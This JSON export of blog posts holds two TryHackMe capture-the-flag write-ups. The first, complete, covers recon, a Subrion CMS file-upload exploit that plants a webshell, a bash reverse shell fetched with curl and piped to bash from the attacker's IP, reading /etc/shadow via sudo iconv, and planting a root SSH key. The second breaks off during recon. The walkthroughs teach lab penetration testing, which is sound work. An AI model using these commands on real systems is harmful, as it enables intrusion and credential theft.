[ { "title": "THM - Tech_Supp0rt:1", "url": "/posts/THM-Tech_Supp0rt1/", "categories": "Tryhackme", "tags": "tryhackme, rce, searchsploit, wordpress, wpscan, nmap, smb, linux, smbclient, file upload, gobuster, nikto, smbmap, gtfobins", "date": "2022-05-01 00:00:00 +0530", "snippet": "Tech_Supp0rt: 1About The RoomHack into the scammer’s under-development website to foil their plans. Url: https://tryhackme.com/room/techsupp0rt1 Creator: Vikaran Difficulty: EasyReconnaissanceNmapnmap -v -sC -sV 10.10.164.212 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 08:37 ISTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedInitiating Ping Scan at 08:37Scanning 10.10.164.212 [2 ports]Completed Ping Scan at 08:37, 0.17s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 08:37Completed Parallel DNS resolution of 1 host. at 08:37, 0.02s elapsedInitiating Connect Scan at 08:37Scanning 10.10.164.212 [1000 ports]Discovered open port 445/tcp on 10.10.164.212Discovered open port 22/tcp on 10.10.164.212Discovered open port 80/tcp on 10.10.164.212Discovered open port 139/tcp on 10.10.164.212Completed Connect Scan at 08:37, 16.49s elapsed (1000 total ports)Initiating Service scan at 08:37Scanning 4 services on 10.10.164.212Completed Service scan at 08:37, 11.59s elapsed (4 services on 1 host)NSE: Script scanning 10.10.164.212.Initiating NSE at 08:37Completed NSE at 08:37, 7.51s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.70s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedNmap scan report for 10.10.164.212Host is up (0.17s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)| 256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)|_ 256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb2-time: | date: 2022-05-01T03:07:51|_ start_date: N/A| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: techsupport| NetBIOS computer name: TECHSUPPORT\\x00| Domain name: \\x00| FQDN: techsupport|_ System time: 2022-05-01T08:37:52+05:30|_clock-skew: mean: -1h49m57s, deviation: 3h10m30s, median: 0sNSE: Script Post-scanning.Initiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedInitiating NSE at 08:37Completed NSE at 08:37, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.15 secondsPort number 139 seems juicy. We’ll get to it later. First, let’s get some more intel about this machine.Gobustergobuster dir -u http://10.10.164.212/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.164.212/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/05/01 08:47:55 Starting gobuster in directory enumeration mode===============================================================/wordpress (Status: 301) [Size: 318] [--&gt; http://10.10.164.212/wordpress/]/test (Status: 301) [Size: 313] [--&gt; http://10.10.164.212/test/] Progress: 18897 / 220561 (8.57%) ^C[!] Keyboard interrupt detected, terminating.Hmmm.., /wordpress seems interesting. Let’s check it out!We got a 404 page on it. Going over the website, we can see that most of the pages don’t have anything useful in it, even looking through the source code doesn’t get us any juicy recon. But, there are two pages named BLOG and SAMPLE PAGE which have some interesting things to look into.Firstly, through the BLOG page, we get author’s name which is support. This might come in handy later on.. who knows.Through the SAMPLE PAGE page, we have a link to your dashboard. The interesting thing here is, when we click on this link we get landed on http://10.0.2.15/wordpress/wp-admin/. Notice, here the ip is changed. So, following the same pattern, we manually type http://10.10.164.212/wordpress/wp-admin/ and voila, we have the wp-login page.Niktonikto -h 10.10.164.212 - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.164.212+ Target Hostname: 10.10.164.212+ Target Port: 80+ Start Time: 2022-05-01 08:47:16 (GMT5.5)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5c367f4428b1f, mtime: gzip+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + /phpinfo.php: Output from the phpinfo() function was found.+ OSVDB-3092: /test/: This might be interesting...+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.+ OSVDB-3233: /icons/README: Apache default file found.+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host+ End Time: 2022-05-01 09:11:59 (GMT5.5) (1483 seconds)---------------------------------------------------------------------------+ 1 host(s) testedExcept /test, we don’t have the type of intel we can work with for this easy level box. So, taking the shot on this /test.Till now, we have done decent exploring in this wordpress site. Now, time to do some more recon!Enum4linuxEnum4linux is a tool for enumerating information from Windows and Samba systems.enum4linux 10.10.164.212 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 1 09:28:16 2022 =========================================( Target Information )=========================================Target ........... 10.10.164.212RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ===========================( Enumerating Workgroup/Domain on 10.10.164.212 )===========================[E] Can't find workgroup/domain ===============================( Nbtstat Information for 10.10.164.212 )===============================Looking up status of 10.10.164.212No reply from 10.10.164.212 ===================================( Session Check on 10.10.164.212 )===================================[+] Server 10.10.164.212 allows sessions using username '', password '' ================================( Getting domain SID for 10.10.164.212 )================================Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can't determine if host is part of domain or part of a workgroup ==================================( OS information on 10.10.164.212 )==================================[E] Can't get OS info with smbclient[+] Got OS info for 10.10.164.212 from srvinfo: TECHSUPPORT Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 =======================================( Users on 10.10.164.212 )=======================================Use of uninitialized value $users in print at ./enum4linux.pl line 972.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.Use of uninitialized value $users in print at ./enum4linux.pl line 986.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988. =================================( Share Enumeration on 10.10.164.212 )================================= Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers websvr Disk IPC$ IPC IPC Service (TechSupport server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP [+] Attempting to map shares on 10.10.164.212//10.10.164.212/print$ Mapping: DENIED Listing: N/A Writing: N/A//10.10.164.212/websvr Mapping: OK Listing: OK Writing: N/A[E] Can't understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*//10.10.164.212/IPC$ Mapping: N/A Listing: N/A Writing: N/A ===========================( Password Policy Information for 10.10.164.212 )===========================[+] Attaching to 10.10.164.212 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s): [+] TECHSUPPORT [+] Builtin[+] Password Info for Domain: TECHSUPPORT [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 ======================================( Groups on 10.10.164.212 )======================================[+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ==================( Users on 10.10.164.212 via RID cycling (RIDS: 500-550,1000-1050) )==================[I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\\nobody (Local User)S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\\None (Domain Group)[+] Enumerating users using SID S-1-5-32 and logon username '', password ''S-1-5-32-544 BUILTIN\\Administrators (Local Group)S-1-5-32-545 BUILTIN\\Users (Local Group)S-1-5-32-546 BUILTIN\\Guests (Local Group)S-1-5-32-547 BUILTIN\\Power Users (Local Group)S-1-5-32-548 BUILTIN\\Account Operators (Local Group)S-1-5-32-549 BUILTIN\\Server Operators (Local Group)S-1-5-32-550 BUILTIN\\Print Operators (Local Group)[+] Enumerating users using SID S-1-22-1 and logon username '', password ''S-1-22-1-1000 Unix User\\scamsite (Local User) ===============================( Getting printer info for 10.10.164.212 )===============================No printers returned.We can see, websvr is one of the shareable resources and scamsite is a local user on this site. Sweet!smbmapSMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.smbmap -H 10.10.164.212 [+] Guest session IP: 10.10.164.212:445 Name: 10.10.164.212 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers websvr READ ONLY IPC$ NO ACCESS IPC Service (TechSupport server (Samba, Ubuntu))We get to know that this websvr can be read by us. So, we’ll be using smbclient.smbclientSMBClient communicates with a LAN Manager server, offering an interface similar to that of the ftp program.smbclient //10.10.164.212/websvrPassword for [WORKGROUP\\uber]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Sat May 29 12:47:38 2021 .. D 0 Sat May 29 12:33:47 2021 enter.txt N 273 Sat May 29 12:47:38 2021 8460484 blocks of size 1024. 5696732 blocks availablesmb: \\&gt; get enter.txtgetting file \\enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)We got an enter.txt file. Let us take a look into it!cat enter.txt GOALS=====1)Make fake popup and host it online on Digital Ocean server2)Fix subrion site, /subrion doesn't work, edit from panel3)Edit wordpress websiteIMP===Subrion creds|-&gt;redacted:redacted [cooked with magical formula]Wordpress creds|-&gt;Woah!! We got some information about a subrion site and got them sweet creds too!subrion siteManually entering 10.10.164.212/subrion/, we get redirected to https://10.0.2.15/subrion/subrion/. Hmmm, let us do a hit and trial, we know that most of the sites have robots.txt, so this one might have too most probably. So, entering http://10.10.164.212/subrion/robots.txt and voila, we have some quite a juicy info!We are interested in /panel. We already have an username, and we need to get the password through CyberChef.Entering the creds in /panel, now we are logged in.But, we don’t want to do anything from here, so signing out we can see the version of this CMS.Getting ShellsearchsploitGoing through searchsploitsearchsploit subrion ---------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------- ---------------------------------Subrion 3.x - Multiple Vulnerabilities | php/webapps/38525.txtSubrion 4.2.1 - 'Email' Persistant Cross-Site Scripting | php/webapps/47469.txtSubrion Auto Classifieds - Persistent Cross-Site Scripting | php/webapps/14391.txtSUBRION CMS - Multiple Vulnerabilities | php/webapps/17390.txtSubrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin) | php/webapps/21267.txtsubrion CMS 2.2.1 - Multiple Vulnerabilities | php/webapps/22159.txtSubrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin) | php/webapps/47851.txtSubrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting | php/webapps/40553.txtSubrion CMS 4.0.5 - SQL Injection | php/webapps/40202.txtSubrion CMS 4.2.1 - 'avatar[path]' XSS | php/webapps/49346.txtSubrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.pySubrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin) | php/webapps/50737.txtSubrion CMS 4.2.1 - Cross-Site Scripting | php/webapps/45150.txtWe’ll mirror the php/webapps/49876.py to our system.searchsploit -m php/webapps/49876.py Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload URL: https://www.exploit-db.com/exploits/49876 Path: /usr/share/exploitdb/exploits/php/webapps/49876.pyFile Type: Python script, ASCII text executable, with very long lines (956)Now, time to run this binary!python3 49876.py -u http://10.10.164.212/subrion/panel/ -l admin -p redacted[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 [+] Trying to connect to: http://10.10.164.212/subrion/panel/[+] Success![+] Got CSRF token: LR6u6npNvGMeAvpkR6ySY9HhbBPNI4W6jpg3nZEw[+] Trying to log in...[+] Login Successful![+] Generating random name for Webshell...[+] Generated webshell name: savbxrtusrtjvcj[+] Trying to Upload Webshell..[+] Upload Success... Webshell path: http://10.10.164.212/subrion/panel/uploads/savbxrtusrtjvcj.phar $ whoamiwww-dataReverse ShellWe’ll be getting a reverse shell. I wrote this simple reverse shell payload for this purpose bash -i &gt;&amp; /dev/tcp/10.9.2.90/1234 0&gt;&amp;1, save this payload in a .sh extension file. We will now start a simple http server python3 -m http.server 8080 and start a netcat listener nc -lvnp 1234 in a new terminal tab.Now, on the victim box, we’ll be using curl curl http://10.9.2.90:8080/shell.sh | bash. curl tries to display the file contents in the shell so to take advantage of this we piped this to bash so that our payload could run. We did not use wget because it was giving a hard time in running.And Voila! We got the shell, but this is a ‘dumb’ shell, we need to upgrade it.nc -lvnp 1234 listening on [any] 1234 ...connect to [10.9.2.90] from (UNKNOWN) [10.10.164.212] 50760bash: cannot set terminal process group (1424): Inappropriate ioctl for devicebash: no job control in this shellwww-data@TechSupport:/var/www/html/subrion/uploads$ whoamiwhoamiwww-datawww-data@TechSupport:/var/www/html/subrion/uploads$ python -c 'import pty; pty.spawn(\"/bin/sh\")'&lt;ww/html/subrion/uploads$ python -c 'import pty; pty.spawn(\"/bin/sh\")' $ export TERM=xterm-256colorexport TERM=xterm-256color$ Looking at the default apache page, /var/www/html/ path kinda looks interesting.$ cd /var/www/html/cd /var/www/html/$ lslsindex.html phpinfo.php subrion test wordpress$ cd wordpresscd wordpress$ lslsindex.php wp-blog-header.php wp-includes wp-settings.phplicense.txt wp-comments-post.php wp-links-opml.php wp-signup.phpreadme.html wp-config.php wp-load.php wp-trackback.phpwp-activate.php wp-content wp-login.php xmlrpc.phpwp-admin wp-cron.php wp-mail.phpHmmm.. this particular wp-config.php file seems interesting. We have to take a look!&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wpdb' );/** MySQL database username */define( 'DB_USER', 'support' );/** MySQL database password */define( 'DB_PASSWORD', 'redacted' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );...We got the password for support user. Trying to change into this user.$ su supportsu supportNo passwd entry for user 'support'Hmmm.. Interesting, it seems that we can’t change into this user but we can login to the wordpress page with the exact credentials.No worries, we have one more user to try and that is scamsite.$ su scamsitesu scamsitePassword: redactedscamsite@TechSupport:/var/www/html/wordpress$ whoamiwhoamiscamsiteYes! We got in! Now it’s time for some privilege escalation!!Privilege EscalationWe can do two things here either we can upload linpeas or we can do some manual work ourselves. I tried both methods, linpeas was taking much time so I skipped it.In the shell, run sudo -l to get to know whether this user can run root level commands without knowing the password or not. For more amazing material, please refer to PayLoadAllTheThingsscamsite@TechSupport:/$ sudo -lsudo -lMatching Defaults entries for scamsite on TechSupport: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser scamsite may run the following commands on TechSupport: (ALL) NOPASSWD: /usr/bin/iconvThis iconv binary can be exploited to read root level files. Like /etc/shadow or if we want to get lazyy we can directly read /root/root.txt. NICE!!Do refer GTFOBins. First, let us read the shadow file.scamsite@TechSupport:/$ LFILE=/etc/shadowLFILE=/etc/shadowscamsite@TechSupport:/$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"$LFILE\"sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"$LFILE\"root:redacted:18775:0:99999:7:::daemon:*:18484:0:99999:7:::bin:*:18484:0:99999:7:::sys:*:18484:0:99999:7:::sync:*:18484:0:99999:7:::games:*:18484:0:99999:7:::man:*:18484:0:99999:7:::lp:*:18484:0:99999:7:::mail:*:18484:0:99999:7:::news:*:18484:0:99999:7:::uucp:*:18484:0:99999:7:::proxy:*:18484:0:99999:7:::www-data:*:18484:0:99999:7:::backup:*:18484:0:99999:7:::list:*:18484:0:99999:7:::irc:*:18484:0:99999:7:::gnats:*:18484:0:99999:7:::nobody:*:18484:0:99999:7:::systemd-timesync:*:18484:0:99999:7:::systemd-network:*:18484:0:99999:7:::systemd-resolve:*:18484:0:99999:7:::systemd-bus-proxy:*:18484:0:99999:7:::syslog:*:18484:0:99999:7:::_apt:*:18484:0:99999:7:::lxd:*:18775:0:99999:7:::messagebus:*:18775:0:99999:7:::uuidd:*:18775:0:99999:7:::dnsmasq:*:18775:0:99999:7:::sshd:*:18775:0:99999:7:::scamsite:redacted:18775:0:99999:7:::mysql:!:18775:0:99999:7:::scamsite@TechSupport:/$ Finally getting the flag..!scamsite@TechSupport:/$ LFILE=/root/root.txtLFILE=/root/root.txtscamsite@TechSupport:/$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"$LFILE\"sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"$LFILE\"redactedAlthough we got the flag, I feel we should do something more..! Let’s generate public and private ssh keys on our machine to connect as root directly.┌──(uber㉿uber)-[~/Desktop/THM/Tech_Supp0rt:1]└─$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/uber/.ssh/id_rsa): Tech_Supp0rtEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in Tech_Supp0rtYour public key has been saved in Tech_Supp0rt.pubThe key fingerprint is:SHA256:Zh43DnRlI0jcayQ2bXhYiwzt1PQlf+ilCn4zNhljxig uber@uberThe key's randomart image is:+---[RSA 3072]----+| .+.X+ = . || o@.B* = . || ++*o.. o o|| ...oo . + || E.= * o || + B = = || . o O || o + || |+----[SHA256]-----+On the victim’s machine, we will exploit the iconv write functionality by using our public key.scamsite@TechSupport:/var/www/html/subrion/uploads$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu2oOGSoMPqskfBzUhe13Mb1VccosdW6HGd7iF0TSX8CqlWyh01oZOIpPxefSLpjoxMFdjyfYVJbFvsRGEmKzmS0AxljOCxQpqdYZ15CgSFROioOwHKai3JSqCkBPJfWyPO4auhQPDHK8Klm0ftxomtgQPJgqAzF7W+YAEbo0lxOp9LgOZZBMT6I83boQReAHA6nC/+RLwnOWIDSn/q2plHwIzP32lvL2Ux9BQ9bqukZXDfTiQ7ykWYQ6Uwihwfyk6ZXK8vsXzOrphGAC+ZpqPWy0dw4vwoPq/xbqH1rf8IIrjV1362NNZAfEGKc4ELm2h741UEh3YMINDG+fBmGPmAh6OiN0Q7gb02uMcLOhT5oXstWPYDWxegKd8xjQph5MAcfQFn5hpVW2WlESXJ8VGGg1En3Sox2bnrcndxxq6SIsc+Lom14nOOeUnrOocgYgClKpKNsasZpoSfrG3HUUEB41dVhNYqYwutIs3NqdjJGw1VQWS2683ahQDmHtCLfU= uber@uber\" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keysNow, from our system, we will attemp an ssh connection using our private key.┌──(uber㉿uber)-[~/Desktop/THM/Tech_Supp0rt:1]└─$ ssh root@10.10.164.212 -i Tech_Supp0rtEnter passphrase for key 'Tech_Supp0rt': Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage120 packages can be updated.88 updates are security updates.Last login: Sun May 1 12:10:25 2022 from 10.9.2.90root@TechSupport:~# whoamirootroot@TechSupport:~# lsroot.txtroot@TechSupport:~# cat root.txtredactedroot@TechSupport:~# That’s it folks, this was all about the Tech_Support box.Thank you so much for being till the end. See you guys next time…!" }, { "title": "THM - Blog", "url": "/posts/THM-Blog/", "categories": "Tryhackme", "tags": "tryhackme, wordpress, wpscan, nmap, steghide, hydra, cve, smb, linux, smbclient, msfconsole, gobuster, nikto, smbmap, binary exploit", "date": "2022-05-01 00:00:00 +0530", "snippet": "BlogAbout The RoomBilly Joel made a Wordpress blog! Url: https://tryhackme.com/room/blog Creator: Nameless0ne Difficulty: MediumFirst Thing FirstWe should add (IP) blog.thm to our /etc/hosts file, so that it runs smoothly via AWS┌──(uber㉿uber)-[~/Desktop/THM/BillyBlog]└─$ cat /etc/hosts | grep blog10.10.43.206 blog.thmReconnaissanceNmapnmap -v -sC -sV 10.10.43.206 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 17:42 ISTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedInitiating Ping Scan at 17:42Scanning 10.10.43.206 [2 ports]Completed Ping Scan at 17:42, 0.17s elapsed (1 total hosts)Initiating Connect Scan at 17:42Scanning blog.thm (10.10.43.206) [1000 ports]Discovered open port 445/tcp on 10.10.43.206Discovered open port 139/tcp on 10.10.43.206Discovered open port 22/tcp on 10.10.43.206Discovered open port 80/tcp on 10.10.43.206Increasing send delay for 10.10.43.206 from 0 to 5 due to 55 out of 183 dropped probes since last increase.Completed Connect Scan at 17:42, 20.72s elapsed (1000 total ports)Initiating Service scan at 17:42Scanning 4 services on blog.thm (10.10.43.206)Completed Service scan at 17:42, 11.70s elapsed (4 services on 1 host)NSE: Script scanning 10.10.43.206.Initiating NSE at 17:42Completed NSE at 17:42, 6.23s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.74s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedNmap scan report for blog.thm (10.10.43.206)Host is up (0.17s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)|_ 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.0|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/wp-admin/139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time: | date: 2022-05-01T12:12:38|_ start_date: N/A| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: blog| NetBIOS computer name: BLOG\\x00| Domain name: \\x00| FQDN: blog|_ System time: 2022-05-01T12:12:38+00:00| nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| BLOG&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| BLOG&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| BLOG&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \\x01\\x02__MSBROWSE__\\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;NSE: Script Post-scanning.Initiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedInitiating NSE at 17:42Completed NSE at 17:42, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 41.07 secondsoooh, we have port 139 open and we now know that the wordpress version being used is 5.0 (vulnerable!). Nice.Also, let’s check out port 80, by simply visiting 10.10.43.206.On the first glance, there seems nothing of interest, even source code does not have anything juicy as such, it’s just a simple blog. But we do get two names Billy Joel and Karen Wheeler. Also, on scrolling down, we are presented with Log in which, as usual is wordpress’s wp-login.php.Gobustergobuster dir -u http://10.10.43.206/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.43.206/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/05/01 17:46:56 Starting gobuster in directory enumeration mode===============================================================/rss (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/feed/]/login (Status: 302) [Size: 0] [--&gt; http://blog.thm/wp-login.php]/0 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/0/] /feed (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/feed/] /atom (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/feed/atom/]/wp-content (Status: 301) [Size: 317] [--&gt; http://10.10.43.206/wp-content/]/admin (Status: 302) [Size: 0] [--&gt; http://blog.thm/wp-admin/] /rss2 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/feed/] /wp-includes (Status: 301) [Size: 318] [--&gt; http://10.10.43.206/wp-includes/]/rdf (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/feed/rdf/] /page1 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/] /' (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/] /dashboard (Status: 302) [Size: 0] [--&gt; http://blog.thm/wp-admin/] /%20 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/] /2020 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/2020/] /wp-admin (Status: 301) [Size: 315] [--&gt; http://10.10.43.206/wp-admin/] No important info here. Moving on..Niktonikto -h 10.10.43.206 - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.43.206+ Target Hostname: 10.10.43.206+ Target Port: 80+ Start Time: 2022-05-01 17:48:09 (GMT5.5)---------------------------------------------------------------------------+ Server: Apache/2.4.29 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ Uncommon header 'link' found, with contents: &lt;http://blog.thm/wp-json/&gt;; rel=\"https://api.w.org/\"+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)+ \"robots.txt\" contains 2 entries which should be manually viewed.+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns 